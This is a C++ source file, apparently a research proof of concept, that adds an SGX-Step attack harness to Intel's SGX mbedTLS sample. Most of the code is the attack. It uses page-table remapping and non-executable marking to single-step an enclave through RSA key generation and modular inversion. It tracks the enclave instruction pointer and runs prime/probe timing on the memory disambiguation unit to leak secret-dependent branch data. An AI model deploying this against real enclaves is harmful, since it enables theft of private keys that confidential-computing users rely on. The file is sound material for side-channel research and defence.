/*
 * Copyright (C) 2011-2021 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <string.h>
#include <assert.h>

# include <unistd.h>
# include <pwd.h>


extern "C" {
	#include "libsgxstep/apic.h"
	#include "libsgxstep/pt.h"
	#include "libsgxstep/sched.h"
	#include "libsgxstep/enclave.h"
	#include "libsgxstep/debug.h"
	#include "libsgxstep/config.h"
	#include "libsgxstep/idt.h"
	#include "libsgxstep/config.h"
}

/*  ====== SGX-step Interface ======  */

extern "C" size_t stld_1(void* mem1, void* mem2);
extern "C" size_t stld_2(void* mem1, void* mem2);
extern "C" size_t stld_3(void* mem1, void* mem2);
extern "C" size_t stld_4(void* mem1, void* mem2);
extern "C" size_t stld_5(void* mem1, void* mem2);
extern "C" size_t stld_6(void* mem1, void* mem2);

#include <signal.h>
#include <vector>
#include <emmintrin.h>

// 用于同步的 page 地址
uint64_t *rsa_gen_key_4a_encl = NULL;
uint64_t *rsa_gen_key_4b_encl = NULL;
uint64_t *ctr_drbg_seed_encl = NULL;
uint64_t *mpi_cmp_mpi_encl = NULL;
uint64_t *mpi_inv_mod_page24_encl = NULL;
uint64_t *mpi_inv_mod_page25_encl = NULL;
uint64_t *mpi_add_abs_encl = NULL;
uint64_t *mpi_init_encl = NULL;
uint64_t *mpi_gen_prime = NULL;
uint64_t *mpi_mod_mpi_encl = NULL;
uint64_t *mpi_shift_r_encl = NULL;
uint64_t *mpi_add_sub_abs_encl = NULL;
uint64_t *rbp_encl = NULL;

// counter
int fault_cnt = 0;
int irq_ite = 0;
int probe_ite = 0;
#define ITE_BOUND 50000
int x_loop_pass[ITE_BOUND];
int sub_step_ground_truth[ITE_BOUND];
size_t timestamp_sub_step_1_0[ITE_BOUND][30];
size_t timestamp_sub_step_1_1[ITE_BOUND][30];
size_t timestamp_sub_step_2_0[ITE_BOUND][30];
size_t timestamp_sub_step_2_1[ITE_BOUND][30];
size_t timestamp_sub_step_3_0[ITE_BOUND][30];
size_t timestamp_sub_step_3_1[ITE_BOUND][30];

// flag
int touch_genkey = 0;	// 是否到达 genkey 函数
int touch_invmod = 0;	// 是否从 genkey 内部到达 invmod 函数
int touch_branch = 0;	// 是否到达 branch
int attack_finish = 0;	// 是否退出被攻击的 invmod 函数
int prime_state = 0;    // 0: 不 prime；1: 第一次 prime；2: 第二次 prime；3: 第三次 prime
int probe_state = 0;	// 0: 不 probe；1: 第一次 probe；2: 第二次 probe；3: 第三次 probe

// #define OUTPUT_BREAK_NUM 2
// uint64_t *output_encl[OUTPUT_BREAK_NUM] = {};

int get_mdu_counte(size_t* timestamp) {
	int edge_bound = 20;
	// for(int i = 1; i < 30; ++ i) {
	// 	printf("%ld ", timestamp[i]);
	// }
	// printf("\n");
	for(int i = 1; i < 30; ++ i) {
		if (((int)timestamp[i - 1] - (int)timestamp[i]) > edge_bound) {
			return i;
		}
	}
	return 15;
}

void release_all_pages(void) {
	*rsa_gen_key_4a_encl = MARK_EXECUTABLE(*rsa_gen_key_4a_encl);
	*rsa_gen_key_4b_encl = MARK_EXECUTABLE(*rsa_gen_key_4b_encl);
	*ctr_drbg_seed_encl = MARK_EXECUTABLE(*ctr_drbg_seed_encl);
	*mpi_cmp_mpi_encl = MARK_EXECUTABLE(*mpi_cmp_mpi_encl);
	*mpi_init_encl = MARK_EXECUTABLE(*mpi_init_encl);
	*mpi_inv_mod_page24_encl = MARK_EXECUTABLE(*mpi_inv_mod_page24_encl);
	*mpi_inv_mod_page25_encl = MARK_EXECUTABLE(*mpi_inv_mod_page25_encl);
	*mpi_gen_prime = MARK_EXECUTABLE(*mpi_gen_prime);
	*mpi_mod_mpi_encl = MARK_EXECUTABLE(*mpi_mod_mpi_encl);
	*mpi_shift_r_encl = MARK_EXECUTABLE(*mpi_shift_r_encl);
	*mpi_add_sub_abs_encl = MARK_EXECUTABLE(*mpi_add_sub_abs_encl);
	*rbp_encl = MARK_WRITABLE(*rbp_encl);
}

void break_rsa_gen_key_4a(void) {
	release_all_pages();
	*rsa_gen_key_4a_encl = MARK_NON_EXECUTABLE(*rsa_gen_key_4a_encl);
}

void break_rsa_gen_key_4b(void) {
	release_all_pages();
	*rsa_gen_key_4b_encl = MARK_NON_EXECUTABLE(*rsa_gen_key_4b_encl);	
}

void break_ctr_drbg_seed(void) {
	release_all_pages();
	*ctr_drbg_seed_encl = MARK_NON_EXECUTABLE(*ctr_drbg_seed_encl);
}

void break_gen_prime(void) {
	release_all_pages();
	*mpi_gen_prime = MARK_NON_EXECUTABLE(*mpi_gen_prime);
}

void break_inv_mod_24_and_add_sub(void) {
	release_all_pages();
	*mpi_add_sub_abs_encl = MARK_NON_EXECUTABLE(*mpi_add_sub_abs_encl);
	*mpi_inv_mod_page24_encl = MARK_NON_EXECUTABLE(*mpi_inv_mod_page24_encl);
}

void break_inv_mod(void) {
	release_all_pages();
	*mpi_inv_mod_page24_encl = MARK_NON_EXECUTABLE(*mpi_inv_mod_page24_encl);
	*mpi_inv_mod_page25_encl = MARK_NON_EXECUTABLE(*mpi_inv_mod_page25_encl);
}

void break_cmp_mpi(void) {
	release_all_pages();
	*mpi_cmp_mpi_encl = MARK_NON_EXECUTABLE(*mpi_cmp_mpi_encl);
}

void break_mpi_init(void) {
	release_all_pages();
	*mpi_init_encl = MARK_NON_EXECUTABLE(*mpi_init_encl);
}

void break_mpi_mod(void) {
	release_all_pages();
	*mpi_mod_mpi_encl = MARK_NON_EXECUTABLE(*mpi_mod_mpi_encl);
}

void break_mpi_shift_r(void) {
	release_all_pages();
	*mpi_shift_r_encl = MARK_NON_EXECUTABLE(*mpi_shift_r_encl);
}

void break_shift_and_cmp (void) {
	release_all_pages();
	*mpi_shift_r_encl = MARK_NON_EXECUTABLE(*mpi_shift_r_encl);
	*mpi_cmp_mpi_encl = MARK_NON_EXECUTABLE(*mpi_cmp_mpi_encl);
	// *mpi_mod_mpi_encl = MARK_NON_EXECUTABLE(*mpi_mod_mpi_encl);
}

void break_add_sub (void) {
	release_all_pages();
	*mpi_add_sub_abs_encl = MARK_NON_EXECUTABLE(*mpi_add_sub_abs_encl);
	// *mpi_inv_mod_encl = MARK_NON_EXECUTABLE(*mpi_inv_mod_encl);
	// *mpi_mod_mpi_encl = MARK_NON_EXECUTABLE(*mpi_mod_mpi_encl);
}

void break_rbp_write (void) {
	release_all_pages();
	*rbp_encl =  MARK_NON_WRITABLE(*rbp_encl);
}

void aep_cb_func(void){
    uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
	// uint64_t erbp = edbgrd_ssa_gprsgx(40);
    // printf("[%d] erip = 0x%lx, rbp = 0x%lx\n", irq_ite, erip, erbp);
	// printf("[%d] erip = 0x%lx\n", irq_ite, erip);
	irq_ite ++;

	if (attack_finish == 1) {
		// break_rsa_gen_key_4a();
		// break_inv_mod();
		goto state_output;
	}
	// 到达 rsa_gen_key 之前
	else if (touch_genkey == 0) {
		if (irq_ite % 2 == 1) {
			break_ctr_drbg_seed();
		}
		else if (irq_ite % 2 == 0) {
			break_rsa_gen_key_4a();
			irq_ite = 0;
			touch_genkey = 1;
		}
		return;
	}
	// 到达 rsa_gen_key 之后，到达 inv_mod_mpi 中的 x-loop 之前
	else if (touch_genkey == 1 && touch_invmod == 0) {
		if(irq_ite >= 1 && irq_ite < 4) {
			if (irq_ite % 2 == 1) {
				break_gen_prime();  // gen_prime
			}
			else {
				break_rsa_gen_key_4a();
			}
		}
		else if (irq_ite >= 4 && irq_ite <= 6){
			if (irq_ite % 2 == 0) {
				break_inv_mod();
			}
			else {
				break_rsa_gen_key_4a();
			}
		}
		else if (irq_ite >= 7 && irq_ite <= 10) {
			if (irq_ite % 2 == 0) {
				break_inv_mod();
			}
			else {
				break_rsa_gen_key_4b();
			}	
		}
		else if (irq_ite == 11) {
			break_mpi_mod();
		}
		else {
			touch_invmod = 1;
			irq_ite = 0;
			break_inv_mod();
		}
		return;
	}
	// 进入 x-loop 后，到达 sub-step 之前
	else if (touch_invmod == 1 && touch_branch == 0) {
		if (irq_ite % 2 == 0) {
			if ((erip & 0xfff) == 0x953 || (erip & 0xfff) == 0xc46) {
				// 完成一次 u-loop 
				x_loop_pass[probe_ite] += 1;
				break_shift_and_cmp();
			}
			else {
				break_shift_and_cmp();
			}
		}
		else{
			if ((erip & 0xfff) == 0xf40) {
				// 进入 sub-step
				// printf("Touch Sub-step!\n");
				touch_branch = 1;
				irq_ite = 0;
				prime_state = 0;
			}
			break_inv_mod();
		}
		return;
	}
	// touch sub-step
	else {
		if (irq_ite % 2 == 0) {
			if (touch_branch == -1) {
				break_add_sub();
				break_inv_mod_24_and_add_sub();
			} 
			else {
				break_add_sub();
			}
		}
		else {
			if (touch_branch == 1 && (erip & 0xfff) == 0x180) {  // 到达 mbedtls_mpi_cmp_int，说明退出了 sub-step
				// printf("Jump out of sup-step!\n");
				touch_branch = -1;
			}
			else if (touch_branch == -1 && (erip & 0xfff) == 0x180) {
				// printf("Jump out of inv mod!\n");
				touch_branch = 0;
				attack_finish = 1;
			}
			else if (touch_branch == -1 && (erip & 0xfff) == 0x67e) {  // 重新回到 x-loop
				touch_branch = 0;
				probe_ite ++;
			}
			break_inv_mod();
		}
		// 设置 prime 和 probe 标记
		if (prime_state == 1) {
			probe_state = 1;
			prime_state = 0;
		}
		else if (prime_state == 2) {
			probe_state = 2;
			prime_state = 0;
		}
		else if (prime_state == 3) {
			probe_state = 3;
			prime_state = 0;
		}
		if (irq_ite == 4) {
			// 第一个 mpi_sub_mpi 函数执行完毕，准备更新 MDU
			if ((erip & 0xfff) == 0x2d1) {
				sub_step_ground_truth[probe_ite] = 1;
			}
			else {
				sub_step_ground_truth[probe_ite] = 0;
			}
			prime_state = 1;
		}
		else if (irq_ite == 6) {
			// 第二个 mpi_sub_mpi 函数执行完毕，准备更新 MDU
			prime_state = 2;
		}
		else if (irq_ite == 8) {
			// 第三个 mpi_sub_mpi 函数执行完毕，准备更新 MDU
			prime_state = 3;
		}
		// 执行 MDU 侧信道
		switch (prime_state)
		{
			case 0:
			default:
				break;

			case 1: {
				int A[10];
				// printf("Prime for the 1st time!\n");
				for (int i = 0; i < 300; ++ i) {
					stld_1(&A[0], &A[8]);
					stld_2(&A[0], &A[8]);
				}
				for (int i = 0; i < 3; ++ i) {
					stld_1(&A[0], &A[0]);
					stld_2(&A[0], &A[0]);
				}
				// _mm_clflush((void*)0x7ffff65fb330);
				break;
			}

			case 2: {
				int A[10];
				for (int i = 0; i < 300; ++ i) {
					stld_3(&A[0], &A[8]);
					stld_4(&A[0], &A[8]);
				}
				for (int i = 0; i < 3; ++ i) {
					stld_3(&A[0], &A[0]);
					stld_4(&A[0], &A[0]);
				}
				break;
			}
			case 3:{
				int A[10];
				for (int i = 0; i < 300; ++ i) {
					stld_5(&A[0], &A[8]);
					stld_6(&A[0], &A[8]);
				}
				for (int i = 0; i < 3; ++ i) {
					stld_5(&A[0], &A[0]);
					stld_6(&A[0], &A[0]);
				}
				break;
			}
		}
		switch (probe_state) {
			case 0:
			default:
				break;

			case 1: {
				// printf("Probe for the 1st time!\n");
				int A[10];
				for (int i = 0; i < 30; ++ i) {
					timestamp_sub_step_1_0[probe_ite][i] = stld_1(&A[0], &A[8]);
				}
				for (int i = 0; i < 30; ++ i) {
					timestamp_sub_step_1_1[probe_ite][i] = stld_2(&A[0], &A[8]);
				}	
				probe_state = 0;
				break;
			}

			case 2: {
				int A[10];
				for (int i = 0; i < 30; ++ i) {
					timestamp_sub_step_2_0[probe_ite][i] = stld_3(&A[0], &A[8]);
				}
				for (int i = 0; i < 30; ++ i) {
					timestamp_sub_step_2_1[probe_ite][i] = stld_4(&A[0], &A[8]);
				}	
				probe_state = 0;
				break;
			}

			case 3: {
				int A[10];
				for (int i = 0; i < 30; ++ i) {
					timestamp_sub_step_3_0[probe_ite][i] = stld_5(&A[0], &A[8]);
				}
				for (int i = 0; i < 30; ++ i) {
					timestamp_sub_step_3_1[probe_ite][i] = stld_6(&A[0], &A[8]);
				}	
				probe_state = 0;
				break;
			}	
		}
		return;
	}

state_output:
	// The code below use erip to synchronize, we can use Copycat instead in SGX release mode 
	if (attack_finish) {  // inv mod finish
		release_all_pages();
		printf("X-loop-ground-truth:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", x_loop_pass[i]);
		}
		printf("\nSub-step-ground-truth:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", sub_step_ground_truth[i]);
		}
		printf("\nSub-step-1-0:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", get_mdu_counte(timestamp_sub_step_1_0[i]));
		}
		printf("\nSub-step-1-1:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", get_mdu_counte(timestamp_sub_step_1_1[i]));
		}
		printf("\nSub-step-2-0:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", get_mdu_counte(timestamp_sub_step_2_0[i]));
		}
		printf("\nSub-step-2-1:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", get_mdu_counte(timestamp_sub_step_2_1[i]));
		}
		printf("\nSub-step-3-0:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", get_mdu_counte(timestamp_sub_step_3_0[i]));
		}
		printf("\nSub-step-3-1:\n");
		for(int i = 0; i <= probe_ite; ++ i) {
			printf("%d ", get_mdu_counte(timestamp_sub_step_3_1[i]));
		}
		printf("\n");
		printf("Probe Finish!\n");	
	}
}



/* Called upon SIGSEGV caused by untrusted page tables. */
namespace {
	void fault_handler(int signal, siginfo_t *info, void *_context) {
		release_all_pages();
	}
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void) {
    ASSERT( !claim_cpu(VICTIM_CPU) );
	struct sigaction sigbreak;
	sigbreak.sa_sigaction = &fault_handler;
	sigemptyset(&sigbreak.sa_mask);
	sigbreak.sa_flags = 0;
	ASSERT(sigaction(SIGSEGV, &sigbreak, NULL) == 0);

    register_aep_cb(aep_cb_func);
    register_enclave_info();
	printf("attacker_config_runtime finished\n");
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void){

	uint64_t addr_mbedtls_rsa_gen_key_4a = 0x7ffff504adf0;
	uint64_t addr_mbedtls_rsa_gen_key_4b = 0x7ffff504b000;
	uint64_t addr_ctr_drbg_seed = 0x7ffff502dca0;
	uint64_t addr_mbedtls_mpi_inv_mod_page24 = 0x7ffff50243c0;
	uint64_t addr_mbedtls_mpi_inv_mod_page25 = 0x7ffff5025000;
	uint64_t addr_mbedtls_mpi_gen_prime = 0x7ffff5025fd0;
	uint64_t addr_mbedtls_mpi_cmp_mpi = 0x7ffff50205e0;
	uint64_t addr_mbedtls_mpi_add_sub_abs = 0x7ffff5021000;
	uint64_t addr_mbedtls_mpi_init = 0x7ffff501ee70;
	uint64_t addr_mbedtls_mpi_mod_mpi = 0x7ffff50223b0;
	uint64_t addr_mbedtls_mpi_shift_r = 0x7ffff5020d40;
	uint64_t addr_mbedtls_rbp = 0x7ffff55fa330;
	ASSERT( rsa_gen_key_4a_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_rsa_gen_key_4a) , PTE) );
	ASSERT( rsa_gen_key_4b_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_rsa_gen_key_4b) , PTE) );
	ASSERT( ctr_drbg_seed_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_ctr_drbg_seed) , PTE) );
	ASSERT( mpi_inv_mod_page24_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_inv_mod_page24) , PTE) );
	ASSERT( mpi_inv_mod_page25_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_inv_mod_page25) , PTE) );
	ASSERT( mpi_gen_prime = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_gen_prime) , PTE) );
	ASSERT( mpi_cmp_mpi_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_cmp_mpi) , PTE) );
	ASSERT( mpi_add_sub_abs_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_add_sub_abs) , PTE) );
	ASSERT( mpi_init_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_init) , PTE) );
	ASSERT( mpi_mod_mpi_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_mod_mpi) , PTE) );
	ASSERT( mpi_shift_r_encl = (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_mpi_shift_r) , PTE) );
	ASSERT( rbp_encl =  (uint64_t*) remap_page_table_level( reinterpret_cast<void*>(addr_mbedtls_rbp) , PTE) );
	break_rsa_gen_key_4a();
	printf("config sgx step finished\n");
	fflush(stdout);
}
/*  ====== SGX-step End ======  */


# define MAX_PATH FILENAME_MAX

#define FAIL_SHA	0x1
#define FAIL_AES	0x2
#define FAIL_ECDSA	0x4

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

typedef struct _sgx_errlist_t {
    sgx_status_t err;
    const char *msg;
    const char *sug; /* Suggestion */
} sgx_errlist_t;

/* Error code returned by sgx_create_enclave */
static sgx_errlist_t sgx_errlist[] = {
    {
        SGX_ERROR_UNEXPECTED,
        "Unexpected error occurred.",
        NULL
    },
    {
        SGX_ERROR_INVALID_PARAMETER,
        "Invalid parameter.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_MEMORY,
        "Out of memory.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_LOST,
        "Power transition occurred.",
        "Please refer to the sample \"PowerTransition\" for details."
    },
    {
        SGX_ERROR_INVALID_ENCLAVE,
        "Invalid enclave image.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ENCLAVE_ID,
        "Invalid enclave identification.",
        NULL
    },
    {
        SGX_ERROR_INVALID_SIGNATURE,
        "Invalid enclave signature.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_EPC,
        "Out of EPC memory.",
        NULL
    },
    {
        SGX_ERROR_NO_DEVICE,
        "Invalid SGX device.",
        "Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
    },
    {
        SGX_ERROR_MEMORY_MAP_CONFLICT,
        "Memory map conflicted.",
        NULL
    },
    {
        SGX_ERROR_INVALID_METADATA,
        "Invalid enclave metadata.",
        NULL
    },
    {
        SGX_ERROR_DEVICE_BUSY,
        "SGX device was busy.",
        NULL
    },
    {
        SGX_ERROR_INVALID_VERSION,
        "Enclave version was invalid.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ATTRIBUTE,
        "Enclave was not authorized.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_FILE_ACCESS,
        "Can't open enclave file.",
        NULL
    },
    {
        SGX_ERROR_NDEBUG_ENCLAVE,
        "The enclave is signed as product enclave, and can not be created as debuggable enclave.",
        NULL
    },
    {
        SGX_ERROR_MEMORY_MAP_FAILURE,
        "Failed to reserve memory for the enclave.",
        NULL
    },
};

/* Check error conditions for loading enclave */
void print_error_message(sgx_status_t ret)
{
    size_t idx = 0;
    size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

    for (idx = 0; idx < ttl; idx++) {
        if(ret == sgx_errlist[idx].err) {
            if(NULL != sgx_errlist[idx].sug)
                printf("Info: %s\n", sgx_errlist[idx].sug);
            printf("Error: %s\n", sgx_errlist[idx].msg);
            break;
        }
    }
    
    if (idx == ttl)
        printf("Error: Unexpected error occurred.\n");
}

/* Initialize the enclave:
 *   Call sgx_create_enclave to initialize an enclave instance
 */
int initialize_enclave(void)
{
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;
    
    /* Call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        return -1;
    }

    return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
    printf("%s", str);
}


/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
    (void)(argc);
    (void)(argv);
    int result = 0xff;

    /* Initialize the enclave */
    if(initialize_enclave() < 0){
        printf("Enter a character before exit ...\n");
        getchar();
        return -1; 
    }

	for(int i = 0; i < ITE_BOUND; ++ i) {
		x_loop_pass[i] = 0;
	}
	attacker_config_runtime();
	idt_t idt = {0};
    map_idt(&idt);
    install_kernel_irq_handler(&idt, (void*)__ss_irq_handler, IRQ_VECTOR);	
	attacker_config_page_table();
    apic_timer_oneshot(IRQ_VECTOR);

    sgx_status_t status = ecall_mbedtls_crypto(global_eid, &result);
    if (status != SGX_SUCCESS) {
	    printf("ERROR: ECall failed\n");
	    print_error_message(status);
	    printf("Enter a character before exit ...\n");
	    getchar();
	    return -1;
    }

    /* Destroy the enclave */
    sgx_destroy_enclave(global_eid);
    
    printf("Info: MbedCrypto Sample completed.\n");

    if ( 0 == result) {
	    printf("Info: All test passed.\n");
    } else {
        if ( result & FAIL_SHA ) printf("ERROR: SHA256 test failed.\n");
        if ( result & FAIL_AES ) printf("ERROR: AES-CTR test failed.\n");
        if ( result & FAIL_ECDSA ) printf("ERROR: ECDSA test failed.\n");
    }
    // printf("Enter a character before exit ...\n");
    // getchar();
    return 0;
}

